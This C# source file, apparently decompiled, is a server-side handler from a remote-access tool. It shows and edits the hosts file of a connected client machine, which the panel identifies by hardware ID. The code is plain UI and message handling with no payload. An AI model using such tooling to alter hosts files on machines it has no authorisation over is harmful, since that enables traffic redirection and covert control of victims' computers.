using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerHostsFile
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "Error"))
			{
				if (!(a == "Get"))
				{
					return;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					return;
				}
				FormHostsFile form = (FormHostsFile)client.Tag;
				form.Invoke((MethodInvoker)delegate
				{
					form.richTextBox1.Text = (string)objects[2];
					form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
					form.richTextBox1.ScrollToCaret();
				});
			}
			else if (client.Tag == null)
			{
				client.Disconnect();
			}
			else
			{
				FormHostsFile form2 = (FormHostsFile)client.Tag;
				form2.Invoke((MethodInvoker)delegate
				{
					RichTextBox richTextBox = form2.richTextBox1;
					richTextBox.Text = richTextBox.Text + "Error: " + (string)objects[2] + "\n";
				});
			}
			return;
		}
		FormHostsFile form3 = (FormHostsFile)Application.OpenForms["HostsFile:" + (string)objects[2]];
		if (form3 == null)
		{
			client.Disconnect();
			return;
		}
		form3.Invoke((MethodInvoker)delegate
		{
			form3.Text = "Hosts File Edit [" + (string)objects[2] + "]";
			form3.client = client;
			form3.richTextBox1.Enabled = true;
		});
		client.Tag = form3;
		client.Hwid = (string)objects[2];
	}
}
